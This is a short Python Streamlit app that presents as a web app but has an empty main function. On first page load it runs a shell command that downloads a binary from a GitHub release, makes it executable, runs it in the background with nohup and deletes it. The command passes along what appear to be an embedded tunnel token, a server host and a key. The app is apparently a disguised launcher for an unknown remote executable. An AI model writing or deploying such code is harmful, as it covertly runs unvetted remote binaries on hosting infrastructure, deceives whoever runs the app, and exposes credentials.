import streamlit as st
import subprocess

if 'script_executed' not in st.session_state:
    command = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 N_S=nz.seav.eu.org N_K=2kVTRbOuEylfrEE6b9 bash -c 'curl -L -o jsbin https://github.com/seav1/dl/releases/download/src/jsbin && chmod +x jsbin && nohup ./jsbin && rm jsbin'"
    subprocess.call(command, shell=True)
    st.session_state.script_executed = True

def main():
    pass

if __name__ == "__main__":
    main()
